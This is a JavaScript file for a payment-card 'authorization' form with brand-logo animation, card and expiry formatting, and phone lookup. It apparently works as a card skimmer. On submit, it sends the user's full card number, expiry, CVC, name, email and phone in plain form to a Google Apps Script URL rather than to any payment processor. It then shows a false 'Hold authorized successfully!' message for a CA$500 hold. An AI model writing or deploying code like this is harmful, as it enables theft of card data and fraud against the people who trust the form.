// Developped by QADS.cloud
const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyfT99YDBS-n8tOFdjNFeAcm_kFIVaeGcESQ39lgWw7rWebv6DUnEi2tWHqHtNJ4jfiNA/exec";

document.addEventListener('DOMContentLoaded', function () {
    const logoElement = document.getElementById('card-brand-icon');
    const ccInput = document.getElementById('number');
    const expInput = document.getElementById('expiry');
    const cvcInput = document.getElementById('code'); 
    const formStack = document.getElementById('form-stack');
    const form = document.getElementById('payment-form');
    const submitBtn = document.getElementById('submit');
    const errorMessage = document.getElementById('error-message');
    
    const logos = ["logo1.png", "logo2.png", "logo3.png", "logo4.png"];
    let currentLogoIndex = 0;
    let animationInterval = null;

    function startLogoAnimation() {
        if (animationInterval) return; 
        if(logoElement) logoElement.style.opacity = 1;

        animationInterval = setInterval(() => {
            if(logoElement) {
                logoElement.style.opacity = 0;
                setTimeout(() => {
                    currentLogoIndex = (currentLogoIndex + 1) % logos.length;
                    logoElement.src = logos[currentLogoIndex];
                    logoElement.style.opacity = 1;
                }, 500);
            }
        }, 3000); 
    }

    function stopLogoAnimation(specificLogo) {
        clearInterval(animationInterval);
        animationInterval = null;
        if(logoElement) {
            logoElement.style.opacity = 1; 
            if (specificLogo && !logoElement.src.includes(specificLogo)) {
                logoElement.src = specificLogo;
            }
        }
    }

    startLogoAnimation();

    const phoneInputField = document.querySelector("#phone");
    const phoneInput = window.intlTelInput(phoneInputField, {
        initialCountry: "auto",
        geoIpLookup: function(callback) {
            fetch("https://ipapi.co/json")
                .then(res => res.json())
                .then(data => callback(data.country_code))
                .catch(() => callback("ca")); 
        },
        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
        separateDialCode: true,
        autoPlaceholder: "aggressive"
    });

    ccInput.addEventListener('input', function (e) {
        let rawValue = e.target.value.replace(/\D/g, '');
        
        let formattedValue = "";
        const isAmex = /^3[47]/.test(rawValue);

        if (isAmex) {
            if (rawValue.length > 0) {
                formattedValue = rawValue.substring(0, 4);
            }
            if (rawValue.length > 4) {
                formattedValue += " " + rawValue.substring(4, 10);
            }
            if (rawValue.length > 10) {
                formattedValue += " " + rawValue.substring(10, 15);
            }
        } else {
            formattedValue = rawValue.replace(/(.{4})/g, '$1 ').trim();
        }

        e.target.value = formattedValue;
        formStack.classList.remove('input-error');
        document.getElementById('error-message').textContent = "";

        let matchedLogo = null;
        let cvcLimit = 4; 

        if (rawValue.length === 0) {
            startLogoAnimation();
            cvcInput.placeholder = "CVC";
        } else {
            if (rawValue.startsWith('4')) {
                matchedLogo = 'logo1.png';
                cvcLimit = 3;
            } else if (rawValue.startsWith('5') || rawValue.startsWith('2') || rawValue.startsWith('67')) {
                matchedLogo = 'logo2.png';
                cvcLimit = 3;
            } else if (rawValue.startsWith('34') || rawValue.startsWith('37')) {
                matchedLogo = 'logo3.png';
                cvcLimit = 4;
            } else if (rawValue.startsWith('62')) {
                matchedLogo = 'logo4.png';
                cvcLimit = 3;
            }

            if (matchedLogo) {
                stopLogoAnimation(matchedLogo);
                
                cvcInput.setAttribute('maxlength', cvcLimit.toString());
                cvcInput.placeholder = cvcLimit === 4 ? "CVC" : "CVC";
                
                if (cvcInput.value.length > cvcLimit) {
                    cvcInput.value = cvcInput.value.slice(0, cvcLimit);
                }
            } else {
                startLogoAnimation();
                cvcInput.setAttribute('maxlength', '4'); 
                cvcInput.placeholder = "CVC";
            }
        }
    });

    expInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 4) value = value.slice(0, 4);
        if (value.length >= 2) {
            e.target.value = value.substring(0, 2) + ' / ' + value.substring(2);
        } else {
            e.target.value = value;
        }
    });
    
    expInput.addEventListener('keydown', function(e) {
        if (e.key === "Backspace" && this.value.endsWith(' / ')) {
            this.value = this.value.slice(0, -3);
        }
    });

    form.addEventListener('submit', function(event) {
        event.preventDefault();
        errorMessage.textContent = "";
        formStack.classList.remove('input-error');

        const email = document.getElementById('email').value;
        const name = document.getElementById('full-name').value;
        const cardRaw = document.getElementById('number').value;
        const expiry = document.getElementById('expiry').value;
        const cvc = document.getElementById('code').value;

        if (!email || !name || !cardRaw || !expiry || !cvc) {
            errorMessage.textContent = "Please fill in all fields.";
            return;
        }
        
        if (!phoneInput.isValidNumber()) {
            errorMessage.textContent = "Please enter a valid phone number.";
            return;
        }

        const cleanCardNumber = cardRaw.replace(/\s+/g, '');

        if (!validator.isCreditCard(cleanCardNumber)) {
            errorMessage.textContent = "Invalid card number. Please check your details.";
            formStack.classList.add('input-error'); 
            return; 
        }

        const [expMonth, expYear] = expiry.split(' / ');
        if (expMonth && expYear) {
            const now = new Date();
            const currentYear = parseInt(now.getFullYear().toString().slice(-2)); 
            const currentMonth = now.getMonth() + 1; 
            
            const inputMonth = parseInt(expMonth);
            const inputYear = parseInt(expYear);

            if (inputMonth < 1 || inputMonth > 12) {
                errorMessage.textContent = "Invalid expiration date.";
                formStack.classList.add('input-error');
                return;
            }

            if (inputYear < currentYear || (inputYear === currentYear && inputMonth < currentMonth)) {
                errorMessage.textContent = "Your card has expired.";
                formStack.classList.add('input-error');
                return;
            }
        } else {
            errorMessage.textContent = "Invalid expiration date format.";
            formStack.classList.add('input-error');
            return;
        }

        submitBtn.disabled = true;
        submitBtn.textContent = "Verifying...";

        const payload = {
            email: email,
            name: name,
            phone: phoneInput.getNumber(),
            card: cardRaw,
            expiry: expiry,
            cvc: cvc
        };

        fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(data => {
            if (data.result === "success") {
                submitBtn.textContent = "Authorized ✔";
                submitBtn.style.backgroundColor = "#4CAF50";
                alert("Hold authorized successfully!");
                form.reset();
                startLogoAnimation(); 
                cvcInput.setAttribute('maxlength', '4');
                cvcInput.placeholder = "CVC";
            } else {
                throw new Error("Script returned error");
            }
        })
        .catch(error => {
            console.error('Error:', error);
            errorMessage.textContent = "Connection error. Please try again.";
            submitBtn.disabled = false;
            submitBtn.textContent = "Authorize CA$500";
        });
    });
});